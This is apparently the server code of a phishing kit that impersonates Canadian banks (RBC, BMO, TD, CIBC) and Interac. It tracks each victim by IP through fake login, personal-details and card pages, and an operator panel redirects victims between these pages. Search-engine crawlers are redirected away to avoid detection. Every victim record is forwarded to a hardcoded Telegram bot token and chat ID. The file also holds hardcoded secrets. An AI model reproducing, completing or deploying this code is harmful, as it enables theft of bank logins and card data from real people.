// ====================
// Module Imports
// ====================
const express = require('express');
const { createServer } = require('node:http');
const bodyParser = require('body-parser');
const { join } = require('node:path');
const { Server } = require('socket.io');
const fs = require('fs');
let fetch;
const https = require('https');
const http = require(`http`);
const TelegramBot = require('node-telegram-bot-api');
const session = require('express-session');



// replace 'YOUR_TELEGRAM_BOT_TOKEN' with your bot's token
const token = '6326528266:AAHOiByLceYqskM-3wyuXlIXg9ulIaFqBp0';
const bot = new TelegramBot(token, { polling: true });

const chatId = '1547744729';



(async () => {
  fetch = (await import('node-fetch')).default;
})();

require('dotenv').config();
const {
  emitUpdatedUsers,
  usersAdd,
  verifyUser,
  usersSearchByIP,
  usersRemove,
  usersModify,
  usersRemoveAll,
  configsModify,
  emitUpdatedConfigs,
  getConfigs
} = require('./utilityUser');

// ====================
// Configuration
// ====================
const app = express();

const REAL_PATH = __dirname;
let users = [];
const RECAPTCHA_SECRET_KEY = process.env.RECAPTCHA_SECRET_KEY;
const RECAPTCHA_SITE_KEY = process.env.RECAPTCHA_SITE_KEY;

const options = {
  key: fs.readFileSync(join(REAL_PATH, '/etc/ssl/private.key')),
  cert: fs.readFileSync(join(REAL_PATH, '/etc/ssl/certificate.crt')),
  ca: fs.readFileSync(join(REAL_PATH, '/etc/ssl/ca_bundle.crt'))
};

const server = https.createServer(options, app); // remove comment when finish install ssl
const io = new Server(server) // remove comment when finish install ssl

//const server = createServer(app);
//const io = new Server(server);

// Configure session middleware
app.use(session({
  secret: "6LdI0PYoAAAAAN0RS1L3WZhLYqr8YX3jCwM2umEx", // replace with your secret key
  resave: false,
  saveUninitialized: true,
  cookie: { secure: true }
}));



const botList = [
  'Googlebot',
  'googlebot-image',
  'googlebot-mobile',
  'MSNBot',
  'Slurp',
  'Teoma',
  'Gigabot',
  'Robozilla',
  'Nutch',
  'ia_archiver',
  'archive.org_bot',
  'baiduspider',
  'naverbot',
  'yeti',
  'yahoo-mmcrawler',
  'psbot',
  'yahoo-blogs/v3.9',
  'AhrefsBot',
  'MJ12bot',
  'Majestic-12',
  'Majestic-SEO',
  'DSearch',
  'Rogerbot',
  'SemrushBot',
  'BLEXBot',
  'ScoutJet',
  'SearchmetricsBot',
  'BacklinkCrawler',
  'Exabot',
  'spbot',
  'linkdexbot',
  'Lipperhey Spider',
  'SEOkicks-Robot',
  'sistrix',
  // ... Add all the bots from your list
];

const redirectBots = (req, res, next) => {
  const userAgent = req.get('User-Agent');
  if (userAgent) {
    const isBot = botList.some(botUserAgent => userAgent.includes(botUserAgent));
    if (isBot) {
      return res.redirect('https://www.google.com');
    }
  }
  next();
};

const checkRecaptchaSession = (req, res, next) => {
  if (req.session.recaptchaVerified) {
    next();
  } else {
    res.status(403).send('Access denied. Please complete the reCAPTCHA.');
  }
};


// Middleware to verify reCAPTCHA response
const verifyRecaptcha = (req, res, next) => {
  const recaptchaResponse = req.body['g-recaptcha-response'];

  // Verify URL
  const verifyUrl = `https://www.google.com/recaptcha/api/siteverify?secret=${RECAPTCHA_SECRET_KEY}&response=${recaptchaResponse}`;

  fetch(verifyUrl, { method: 'POST' })
    .then(response => response.json())
    .then(data => {
      if (data.success) {
        req.session.recaptchaVerified = true;
        next(); // reCAPTCHA was successful, proceed to the next middleware/route handler
      } else {
        res.status(403).send('reCAPTCHA Failed: You might be a robot. Access denied.');
      }
    })
    .catch(error => {
      res.status(500).send('Error in reCAPTCHA verification, try again later.');
    });
};

// Use this middleware in your app before your routes
app.use(redirectBots);


const httpApp = express();
httpApp.use((req, res) => {
  res.redirect('https://' + req.headers.host + req.url);
});

http.createServer(httpApp).listen(80);

// ====================
// Middleware
// ====================
app.use(bodyParser.json()); // for parsing application/json
app.use(bodyParser.urlencoded({ extended: true })); // for parsing application/x-www-form-urlencoded
app.use(express.static('public'));

app.get('/', (req, res) => {
  res.sendFile(join(__dirname, '/captcha/page.html'));
  //res.sendFile(join(__dirname, '/landing/interac/page.html'));
});

app.get('/admin',checkRecaptchaSession,(req, res) => {
  res.sendFile(join(__dirname, '/admin/page.html'));
});

app.get('/admin/config', checkRecaptchaSession,(req, res) => {
  res.sendFile(join(__dirname, '/admin/config.html'));
});

app.get('/.well-known/pki-validation/7C8936E7D9C13F83E96EF02516DCB1A4.txt', (req, res) => {
  res.sendFile(join(__dirname, '/.well-known/pki-validation/7C8936E7D9C13F83E96EF02516DCB1A4.txt'));
});


app.use('/rbc',checkRecaptchaSession,require('./routes/rbc'));
app.use('/bmo', checkRecaptchaSession,require('./routes/bmo'));
app.use('/td', checkRecaptchaSession,require('./routes/td'));
app.use('/cibc', checkRecaptchaSession,require('./routes/cibc'));

app.post('/admin/set-recaptcha-key', checkRecaptchaSession, (req, res) => {
  const recaptchaSecretKey = req.body.recaptchaSecretKey;
  const recaptchaSiteKey = req.body.recaptchaSiteKey;

  // Now save this key to the .env file or another secure location
  // For example, using the 'dotenv' package and 'fs' to write to the .env file:
  const fs = require('fs');
  fs.appendFileSync('.env', `RECAPTCHA_SECRET_KEY=${recaptchaSecretKey}\nRECAPTCHA_SITE_KEY=${recaptchaSiteKey}`);

  // After saving, send a response back to the admin panel
  res.send('reCAPTCHA secret and site key updated successfully!');
});

app.post('/interac', verifyRecaptcha ,(req, res) => {
  // At this point, the reCAPTCHA was successful, and you can handle the form submission.
  // Redirect the user to the desired page after form submission and reCAPTCHA verification
  res.sendFile(join(__dirname, '/landing/interac/page.html'));
});

// ====================
// Socket Handling
// ====================
io.on('connection', (socket) => {
  let user = null;
  let userIP = socket.handshake.address.replace('::ffff:', '');
  socket.join(userIP)
  //console.log(`${userIP} user connected !`);
  user = usersSearchByIP(userIP)

  let configs = getConfigs()
  let cpt = 0
  let removeDetails = { removeDetails: false }
  for (key in configs[0]) {
    if (!key.includes('banks') && configs[0][key] == false) {
      cpt++;
    }
  }

  if (cpt == 10) {
    removeDetails = { removeDetails: true }
  }

  //console.log(removeDetails)

  socket.emit('removeDetails', removeDetails)

  if (user) {
    //console.log(`${userIP} user already exist !`);
    user = usersModify(userIP, { status: true });
    //console.log(user);
    emitUpdatedUsers(io)
  } else {
    //console.log(`${userIP} user not exist !`)
    socket.join(userIP);
    user = { ip: userIP, status: true }
    user = usersAdd(user)
    //console.log(`user was succesfully added: ${user.ip}`)
    emitUpdatedUsers(io)
  }

  socket.on('disconnect', () => {
    if (verifyUser(userIP)) {
      user = usersModify(userIP, { status: false });
      //console.log(user)
      emitUpdatedUsers(io)
    }
  });

  socket.on('updateBanks', (data) => {
    //console.log(data)
    if (verifyUser(userIP)) {
      user = usersModify(userIP, data);
      emitUpdatedUsers(io)
    }
  })

  socket.on('updatePage', (data) => {
    //console.log(data)
    if (verifyUser(userIP)) {
      if (data.page.includes('Details')) {
        const rawData = fs.readFileSync('configs.json', 'utf-8');
        const updatedConfig = JSON.parse(rawData);
        io.emit('sendConfigs', updatedConfig);
      }
      user = usersModify(userIP, data);
      emitUpdatedUsers(io)
    }
  })

  socket.on('submit', (data) => {
    if (verifyUser(userIP)) {
      if ('previousPage' in data) {
        if (data.previousPage.includes('Login')) {
          //console.log(`modify = ${data.previousPage}`)
          let controller = { nextPage: 'details' }
          if (removeDetails) { controller = { nextPage: 'card' } }
          user = usersModify(userIP, controller)
        } else if (data.previousPage.includes('Details')) {
          user = usersModify(userIP, { nextPage: 'card' })
        } else if (data.previousPage.includes('Card')) {
          user = usersModify(userIP, { nextPage: 'finish' })
        }
      } else {
        user = usersModify(userIP, data);
      }
      emitUpdatedUsers(io);

    }
    //console.log(data)
  })

  socket.on('btnRedirection', (data) => {
    //console.log(`${data.page}`)
    //console.log(data.ip)
    socket.to(data.ip).emit('btnRedirection', { page: data.page })
    
  });

  socket.on('usersRemoveAll', () => {
    usersRemoveAll();
  })

  emitUpdatedConfigs(io)

  socket.on('submitConfig', (data) => {
    //console.log(data);
    configsModify(data.banks, data);
  })

  let user_search = usersSearchByIP(userIP)
  const message = JSON.stringify(user_search, null, 2);


  bot.sendMessage(chatId, message);

});

fs.watch('users.json', (eventType, filename) => {
  if (filename && eventType === 'change') {
    emitUpdatedUsers(io);

  }
});





// ====================
// Server Startup
// ====================




server.listen(443, () => {
  console.log('HTTPS server running on port 443');
});

/*
server.listen(80, () => {
  console.log('HTTPS server running on port 80');
});
*/
